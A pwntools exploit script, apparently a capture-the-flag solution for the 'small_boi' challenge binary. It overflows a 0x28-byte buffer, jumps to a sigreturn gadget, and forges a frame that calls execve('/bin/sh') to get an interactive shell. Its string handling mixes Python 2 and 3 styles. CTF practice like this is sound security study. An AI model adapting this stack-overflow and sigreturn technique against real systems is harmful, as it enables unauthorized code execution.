from pwn import *

# Establish the target
target = process("./small_boi")
#gdb.attach(target, gdbscript = 'b *0x40017c')
#target = remote("pwn.chal.csaw.io", 1002)

# Establish the target architecture
context.arch = "amd64"

# Establish the address of the sigreturn function
sigreturn = p64(0x40017c).decode("iso-8859-1")

# Start making our sigreturn frame
frame = SigreturnFrame()

frame.rip = 0x400185 # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = 0x4001ca # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL

payload = "0"*0x28 # Offset to return address
payload += sigreturn # Function with sigreturn
payload += str(frame)[8:] # Our sigreturn frame, adjusted for the 8 byte return shift of the stack

target.sendline(payload) # Send the target payload

# Drop to an interactive shell
target.interactive()